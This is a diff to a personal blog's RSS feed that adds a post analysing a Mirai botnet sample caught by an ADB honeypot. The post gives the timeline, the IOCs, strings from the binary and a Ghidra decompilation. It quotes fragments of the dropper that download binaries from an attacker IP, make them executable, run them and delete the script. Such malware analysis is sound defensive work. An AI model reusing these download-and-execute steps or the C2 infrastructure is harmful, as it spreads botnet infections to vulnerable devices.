@@ -4,9 +4,60 @@
         <title>Nathan's Blog Blog</title>
         <link>https://nburns.tech/blog</link>
         <description>Nathan's Blog Blog</description>
-        <lastBuildDate>Tue, 28 Dec 2021 07:14:16 GMT</lastBuildDate>
+        <lastBuildDate>Thu, 06 Jan 2022 06:43:43 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>https://github.com/jpmonette/feed</generator>
+        <item>
+            <title><![CDATA[Analysis of Mirari Malware]]></title>
+            <link>https://nburns.tech/blog/mirai</link>
+            <guid>mirai</guid>
+            <pubDate>Thu, 06 Jan 2022 06:43:43 GMT</pubDate>
+            <description><![CDATA[Intro]]></description>
+            <content:encoded><![CDATA[<h2>Intro</h2><p>I recently found out Google Cloud offers $300 for first time users, so I figured what better way to spend that than deploying a honeypot? While this blog post won&#x27;t go into detail on deploying one yourself (keep at eye on my <a href="/docs/welcome">docs</a> for a that) it will go into detail analyzing a malware sample that I discovered being deployed against it.</p><h2>Timeline and Recon</h2><p>On January 4th 2022 at ~20:30 UTC my honeypot deployed in Oregon was attacked by 205.185.123.62 hosted in <a href="https://www.iplocationtools.com/205.185.123.62">Las Vegas, Nevada.</a>  It&#x27;s hosted by &quot;Frantech Solutions&quot; which a cursoury google search gives results such as &quot;FranTech Solutions is <strong>a high fraud risk ISP</strong>..&quot; and <a href="https://scamalytics.com/ip/isp/frantech-solutions">scamalytics</a> gives it a score of 64.</p><p>My honeypot was attacked a total of 24 times from this IP address. Starting at 20:30 UTC and ending at 11:00 UTC. </p><h2>Attack Vector</h2><p>This attack was caught by the <a href="https://github.com/huuck/ADBHoney">ADBHoney</a> service running on my honeypot. ADBHoney describes itself as a &quot;Low interaction honeypot designed for Android Debug Bridge over TCP/IP.&quot; Now I have some experience with ADB in a pior CTF so I understood a small bit of what this honeypot does. ADB is the Andriod Debug Bridge. It&#x27;s essentially a protocol/tool that allows developers to communicate with andriod devices. It&#x27;s used prominately in the emulation part of Andriod Studio. Unfortunately for us, the TCP section of the ADB protocol <strong>does not</strong> have any kind of authentication, leaving it open to attacks. This is what the honeypot sets up to gather samples.</p><h2>Payload</h2><p><img src="/img/mirai/initial_payload.png" alt="image"/>
+<em>Figure 1: Inital Attack</em></p><p>As we can see in Figure 1, the inital attack involves moving into the tmp directory, using <a href="https://busybox.net/">busybox</a> to execute wget to get another sample and executes it. It repeats this twice, opting for curl for the second sample. Switching tools like that is common in malware droppers, allowing it to be ran on more hosts. A potential target could be missing either curl or wget, but missing both would be unlikely. Both <strong>w.sh</strong> and <strong>c.sh</strong> are essentially the same file as seen below. The only difference being what tool is used to download the next stage.</p><p><img src="/img/mirai/wget.png" alt="image"/>
+<em>Figure 2: wget method</em></p><p><img src="/img/mirai/curl.png" alt="image"/>
+<em>Figure 3: curl method</em></p><p>Here we can see how the actual malware sample is being downloaded. What makes this particular malware sample interesting is how it has different exectuables for a large set of instruction sets, ranging from ARM to SH4 to MIPS and even sparc. The first part of each line is downloading the malware <code>curl htt[p]s://209.141.33.122/arm</code>, then setting it as executable <code>chmod 777 arm</code>, then executing it with the argument of &quot;android&quot; <code>./arm android</code>. The final part of the script <code>rm $0</code> is deleting the script that was just ran in an effort to evade analysis. </p><h2>Detection Rate and VirusTotal</h2><p>Uploading the MIPS sample to <a href="https://www.virustotal.com/gui/file/10a5fabf1847feb44437827b040f707b432b3cc93167720fe9879ca33477d5c1/detection">VirusTotal</a> gives it a detection ratio of 36/56 and most AV vendors classify this sample as belonging to the <a href="https://en.wikipedia.org/wiki/Mirai_(malware)">Mirai</a> botnet. It was first seen on December 29th, 2021.  </p><p>VirusTotal Link: <a href="https://www.virustotal.com/gui/file/10a5fabf1847feb44437827b040f707b432b3cc93167720fe9879ca33477d5c1/detection">https://www.virustotal.com/gui/file/10a5fabf1847feb44437827b040f707b432b3cc93167720fe9879ca33477d5c1/detection</a>  </p><h2>IOCs</h2><p>If you see network activity to these IPs/Domains or system activity relating to them, you might be infected.<br/>
+<!-- -->IPs: 209.141.33.122<br/>
+<!-- -->Domains: bots1.firewalla1337.cc, scan1.firewalla1337.cc<br/>
+<!-- -->System Activity: Creation of binaries in <code>/data/local/tmp</code> with the names of common instruction sets. Execution of binaries with the argument of <code>android</code>.  </p><h2>Analysis</h2><p>Note: My reversing skills are still in its infancy, so please bear with me.</p><p>The first thing I did to this binary was run strings against it. This gave me some interesting findings seen below:</p><h3>Strings</h3><p><code>/dev/null</code><br/>
+<code>POST /cdn-cgi/</code><br/>
+<code>HTTP/1.1\r\nUser-Agent:</code><br/>
+<code>\r\nHost:</code><br/>
+<code>Cookie: </code><br/>
+<code>bots1.firewalla1337.cc</code><br/>
+<code>209.141.33.122</code><br/>
+<code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678</code><br/>
+<code>dadlcldadg</code><br/>
+<code>scan1.firewalla1337.cc</code>    </p><p>Lets open this sample in ghidra and look into it a bit further.</p><p>The only function I could make sense of was what to me looks like a domain resolution function here:</p><pre><code class="language-c">void FUN_00410544(void)
+
+{
+  byte *pbVar1;
+  uint uVar2;
+  undefined2 *puVar3;
+  int iVar4;
+  
+  pbVar1 = (byte *)FUN_00411908(&quot;bot[s]1.firewalla1337.cc&quot;);
+  if (pbVar1 != (byte *)0x0) {
+    iVar4 = *(int *)(pbVar1 + 4);
+    uVar2 = FUN_00411518();
+    if (*pbVar1 == 0) {
+      trap(0x1c00);
+    }
+    DAT_0045d784 = *(undefined4 *)((uVar2 % (uint)*pbVar1) * 4 + iVar4);
+    FUN_0041189c(pbVar1);
+    FUN_00414e24(1);
+    puVar3 = (undefined2 *)FUN_00414d0c(1,0);
+    DAT_0045d782 = *puVar3;
+                    /* WARNING: Could not recover jumptable at 0x00410634. Too many branches */
+                    /* WARNING: Treating indirect jump as call */
+    FUN_00414d40(1);
+    return;
+  }
+  DAT_0045d784 = FUN_00417c20(&quot;209.1[4]1.33.122&quot;);
+  return;
+}
+</code></pre><p><em>Brackets in IP address and Domain added by myself</em></p><p>Both the domain name and IP address are hardcoded, but these are both the same address of the machine where the attack originated from meaning we dont have the C2&#x27;s address.</p><p>There are references to POSTs and setting URL variables in the malware which tells me that&#x27;s most likely the way communication is handled between the C2 and the bots.  </p><h2>Closing Thoughts</h2><p>Unfortunately this is the extent of my analysis of this sample. My reversing skills arent where they should be in order to properly reverse this sample. I would try dynamic analysis and see what domains/IPs this sample tries to contact, but the x86 version was not available and I do not have any spare system capable of executing the other instruction sets besides my Raspberry Pi4s, so lookout for a potential part 2 of this post where I execute the malware in a lab environment.</p><p>Thank you so much for reading this post. I learned a lot while investigating this sample and hopefully you learned something new reading this blog post. I hope to post more about my activities with my honeypot so keep an eye out for those posts when they drop.   </p><p>As always, if you have any feedback please don&#x27;t hesitate to contact me at <a href="mailto:nathan@nburns.tech?Subject=Reverse_Blogpost">my email.</a></p><p>Nathan Burns</p>]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[Current Reading List]]></title>
             <link>https://nburns.tech/blog/reading_list</link>
